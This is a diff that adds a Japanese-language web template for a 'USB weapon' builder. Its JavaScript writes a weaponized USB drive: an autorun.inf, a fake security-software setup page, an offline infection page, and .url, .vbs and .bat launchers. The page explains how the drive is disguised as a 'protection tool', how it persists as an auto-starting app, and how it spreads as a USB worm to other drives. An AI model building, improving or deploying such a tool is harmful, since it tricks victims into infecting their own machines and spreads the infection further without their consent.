@@ -1,0 +1,242 @@
+{% extends "base.html" %}{% block title %}💾 USB兵器 — 特異点 ULTIMATE{% endblock %}{% block content %}
+<h1>💾 USBメモリー型 兵器 — 特異点 ULTIMATE ver.</h1>
+<p class="dim">
+  USBに「偽セキュリティソフト」を仕込んで、相手のPCに挿してもらうだけで感染させます。<br>
+  挿した瞬間にAutoPlayが立ち上がり、<b>1.2秒で最終形態（L5）で発火</b>します。
+  <b>ネットに繋がっていないPCでも動きます。</b>
+</p>
+
+<div class="card">
+  <h3>① 設定</h3>
+  <div style="display:grid;gap:8px;max-width:560px">
+    <label>仕込むリンク
+      <select id="code">
+        {% for l in links %}
+        <option value="{{ l.code }}" {% if l.code == code %}selected{% endif %}>
+          {{ l.name }} / {{ l.code }} / {{ l.mode }}{% if l.mode == 'singularity' %}（特異点）{% endif %} / 踏まれた {{ l.hits }}回
+        </option>
+        {% endfor %}
+      </select></label>
+    {% if not links %}
+    <div class="dim">まだリンクがありません。下の「特異点リンクを新規作成」を押してください。</div>
+    {% endif %}
+
+    <label>起動レベル
+      <select id="level">
+        {% for k, v in levels.items() %}
+        <option value="{{ k }}" {% if k == level %}selected{% endif %}>L{{ k }} {{ v }}</option>
+        {% endfor %}
+      </select></label>
+
+    <label>ドライブの表示名（USBに付く名前）
+      <input type="text" id="label" value="{{ label }}" maxlength="32"></label>
+
+    <label class="chk">
+      <input type="checkbox" id="windows" {% if windows %}checked{% endif %}>
+      子ウィンドウも開く（さらに重い・既定OFF）</label>
+
+    <div class="dim" id="preview"></div>
+  </div>
+
+  <div class="row" style="margin-top:12px">
+    <form method="post" action="/usb/new" style="margin:0">
+      <input type="hidden" name="name" value="USB">
+      <input type="hidden" name="level" value="{{ level }}">
+      <button type="submit">特異点リンクを新規作成</button></form>
+  </div>
+</div>
+
+<div class="card">
+  <h3>② USBを挿して、書き込む</h3>
+  <ol class="dim" style="line-height:2">
+    <li>相手に渡すUSBメモリーを、<b>いまこのPCに挿す</b></li>
+    <li>下の「USBに直接書き込む」を押す</li>
+    <li>フォルダ選択で <b>USBの一番上（ドライブのルート、例: <span class="mono">E:\</span>）</b> を選ぶ</li>
+    <li>完了したら、USBを安全に取り外す</li>
+  </ol>
+  <div class="row">
+    <button id="go" class="big" type="button">▶ USBに直接書き込む</button>
+    <button id="zip" type="button">ZIPでダウンロード（Firefox/Safari向け）</button>
+    <a id="prev" class="btn" target="_blank" href="#">仕込んだURLを開いて確認</a>
+  </div>
+  <div id="log" class="log"></div>
+  <div id="done" class="done" style="display:none">
+    ✅ <b>書き込み完了</b>。USBを安全に取り外して、相手のPCに挿してください。<br>
+    <span class="dim">相手が挿すとAutoPlayが「<b id="dl2"></b>を実行」と出ます → 押すだけ。</span>
+  </div>
+</div>
+
+<div class="card">
+  <h3>③ USBの中身（こうなります）</h3>
+  <table class="mono">
+    <tr><th>autorun.inf</th><td>挿した瞬間にAutoPlayで「実行」させる定義。ラベルとアイコンも指定</td></tr>
+    <tr><th>START.html</th><td>偽セットアップ画面。オンラインなら感染URLへ、<b>オフラインなら offline.html へ</b></td></tr>
+    <tr><th>offline.html</th><td><b>感染体そのもの</b>。ネットが無いPCでも挿すだけで発火</td></tr>
+    <tr><th>icon.ico</th><td>ドライブのアイコン（SINGULARITYの紋章）</td></tr>
+    <tr><th id="t1">保護ツール.url</th><td>ダブルクリックで起動（コンソール無し・最安全）</td></tr>
+    <tr><th id="t2">保護ツール.vbs</th><td>ダブルクリックで起動（無音・無窓）</td></tr>
+    <tr><th>install.bat</th><td>どこでも動く最終フォールバック</td></tr>
+    <tr><th>はじめに.txt</th><td>手順書（相手が読む）</td></tr>
+  </table>
+  <div class="dim" style="margin-top:8px">
+    ※ 既存ファイルは同名のみ上書きします。USBの中身は消しません。<br>
+    ※ USBに既に <span class="mono">autorun.inf</span> がある場合は、そちらが上書きされます。
+  </div>
+</div>
+
+<div class="card">
+  <h3>④ 伝染させる（USBワーム）</h3>
+  <div class="dim" style="line-height:2">
+    感染したPCの画面の<b>右下に「🔌 USBにも仕込む」</b>が出ます。<br>
+    相手が<b>自分のUSBを挿して1回押す</b>と、そのUSBが武装されます。<br>
+    次にそのUSBを別のPCに挿すと、同じ感染が起きます。以後は記憶されるので<b>無操作で再武装</b>します。
+  </div>
+</div>
+
+<div class="card">
+  <h3>⑤ 相手側でどう見えるか</h3>
+  <div class="dim" style="line-height:2">
+    ・エクスプローラーで、ドライブ名が「<b id="t3">保護ツール</b>」、アイコンが紋章に変わります<br>
+    ・挿した瞬間、AutoPlayの先頭に「<b id="t4">保護ツールを実行</b>」が出ます<br>
+    ・押すとブラウザが開き、偽セットアップ画面 → 1.2秒で<b>最終形態（L5）</b>で発火<br>
+    ・画面のどこかをクリックすると<b>PWAとして常駐</b>インストールできます<br>
+    ・インストール後はOSログイン時にも自動起動します
+  </div>
+  <div class="warn" style="margin-top:10px">
+    ⚠ Windows XP は無クリックで自動実行します。Windows 7 以降は、USBはAutoPlay扱いのため
+    <b>ダイアログが1回出ます</b>（仕様）。出ない設定のPCでは「<b id="t5">保護ツール.url</b>」を
+    ダブルクリックさせるだけです。
+  </div>
+</div>
+
+<style>
+.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:14px;margin:10px 0}
+.card h3{margin:0 0 10px;font-size:14px;color:#c7cddb}
+.dim{color:#8b93a7;font-size:12px;line-height:1.85}
+.mono,table.mono td,table.mono th{font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+table.mono{width:100%;border-collapse:collapse}
+table.mono th{text-align:left;color:#8b93a7;padding:4px 8px 4px 0;white-space:nowrap;vertical-align:top;font-weight:400}
+table.mono td{color:#c7cddb;padding:4px 0;border-bottom:1px solid #232734}
+input[type=text],select{width:100%;box-sizing:border-box;padding:7px 9px;background:#11141a;
+  color:#e6e9ef;border:1px solid #262b36;border-radius:6px;margin-top:3px}
+label{display:block;font-size:12px;color:#8b93a7}
+.chk{display:flex;gap:8px;align-items:center;font-size:12.5px;color:#c7cddb;margin-top:6px}
+.chk input{width:auto}
+.row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:10px}
+button{padding:9px 16px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  border:1px solid #39415a;font-size:13px;cursor:pointer;font-weight:600}
+button.big{background:#00c46a;border-color:#00c46a;color:#04240f;padding:12px 22px;font-weight:700}
+button:disabled{opacity:.5;cursor:default}
+a.btn{padding:9px 16px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  border:1px solid #39415a;text-decoration:none;font-size:13px}
+.log{margin-top:12px;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;
+  color:#8b93a7;white-space:pre-wrap;line-height:1.8;max-height:260px;overflow:auto}
+.done{margin-top:12px;background:#10251a;border:1px solid #1f5c42;color:#bff5d8;
+  border-radius:8px;padding:12px;font-size:13px;line-height:1.9}
+.warn{background:#2a2210;border:1px solid #5a4a1f;color:#f0c869;border-radius:8px;
+  padding:9px 11px;font-size:12px;line-height:1.75}
+</style>
+
+<script>
+(function () {
+  var $ = function (id) { return document.getElementById(id); };
+  var LOG = [], TAG = Math.random().toString(36).slice(2, 10);
+
+  function params(extra) {
+    var p = new URLSearchParams();
+    p.set("code", $("code") ? $("code").value : "");
+    p.set("level", $("level").value);
+    p.set("label", $("label").value || "保護ツール");
+    p.set("tag", TAG);
+    p.set("windows", $("windows").checked ? "8" : "0");
+    if (extra) for (var k in extra) p.set(k, extra[k]);
+    return p.toString();
+  }
+
+  function log(s) { LOG.push(s); $("log").textContent = LOG.join("\n"); $("log").scrollTop = 1e9; }
+
+  function syncPreview() {
+    var lb = $("label").value || "保護ツール";
+    var q = params();
+    fetch("/usb/manifest?" + q).then(function (r) { return r.json(); }).then(function (j) {
+      $("preview").innerHTML = "仕込むURL: <span class='mono'>" + j.url + "</span>" +
+        "<br>生成ファイル: " + j.files.length + "個 / 合計 " + Math.round(j.total / 1024) + " KB";
+      $("prev").href = j.url;
+    }).catch(function () {});
+    $("t1").textContent = lb + ".url";
+    $("t2").textContent = lb + ".vbs";
+    $("t3").textContent = lb;
+    $("t4").textContent = lb + "を実行";
+    $("t5").textContent = lb + ".url";
+    $("dl2").textContent = lb;
+  }
+
+  ["code", "level", "label", "windows"].forEach(function (id) {
+    var el = $(id); if (!el) return;
+    el.addEventListener("change", syncPreview);
+    el.addEventListener("input", syncPreview);
+  });
+
+  $("zip").addEventListener("click", function () {
+    if (!$("code") || !$("code").value) { alert("先にリンクを作成してください"); return; }
+    location.href = "/usb/zip?" + params();
+  });
+
+  $("go").addEventListener("click", function () {
+    if (!$("code") || !$("code").value) { alert("先にリンクを作成してください"); return; }
+    if (!window.showDirectoryPicker) {
+      alert("このブラウザはUSBへの直接書き込みに未対応です。\n「ZIPでダウンロード」を使って、手でUSBに展開してください。");
+      return;
+    }
+    var q = params();
+    $("go").disabled = true; LOG = []; $("done").style.display = "none";
+    log("▶ USBへの書き込みを開始します…");
+
+    window.showDirectoryPicker({ mode: "readwrite", startIn: "desktop" })
+      .then(function (dir) {
+        log("選択されたフォルダ: " + dir.name);
+        log("※ ここがUSBのルート（例: E:\\）であることを確認してください");
+        return fetch("/usb/manifest?" + q).then(function (r) { return r.json(); })
+          .then(function (j) {
+            if (!j || !j.ok || !j.files.length) throw new Error("manifest取得失敗");
+            log("生成対象: " + j.files.length + "ファイル / " + Math.round(j.total / 1024) + " KB");
+            var chain = Promise.resolve();
+            j.files.forEach(function (f, i) {
+              chain = chain.then(function () {
+                log("  [" + (i + 1) + "/" + j.files.length + "] " + f.name + " を書き込み中…");
+                return fetch("/usb/file/" + f.idx + "?" + q)
+                  .then(function (r) { if (!r.ok) throw new Error(f.name + " 取得失敗"); return r.blob(); })
+                  .then(function (blob) { return dir.getFileHandle(f.name, { create: true }); })
+                  .then(function (fh) { return fh.createWritable(); })
+                  .then(function (w) { return w.write(blob).then(function () { return w.close(); }); });
+              });
+            });
+            return chain;
+          })
+          .then(function () {
+            log("  検証中…");
+            return dir.getFileHandle("autorun.inf").then(function (fh) { return fh.getFile(); })
+              .then(function (f) {
+                if (f.size < 20) throw new Error("autorun.inf が空です");
+                log("  ✓ autorun.inf を確認（" + f.size + " バイト）");
+              });
+          });
+      })
+      .then(function () {
+        log("✅ 完了しました。");
+        $("done").style.display = "block";
+        $("go").disabled = false;
+      })
+      .catch(function (e) {
+        if (e && e.name === "AbortError") { log("中止されました。"); $("go").disabled = false; return; }
+        log("✗ 失敗: " + (e && e.message ? e.message : e));
+        log("→ 権限を拒否した場合は、もう一度押して「編集を許可」を選んでください。");
+        log("→ どうしてもダメなら「ZIPでダウンロード」を使ってください。");
+        $("go").disabled = false;
+      });
+  });
+
+  syncPreview();
+})();
+</script>
+{% endblock %}
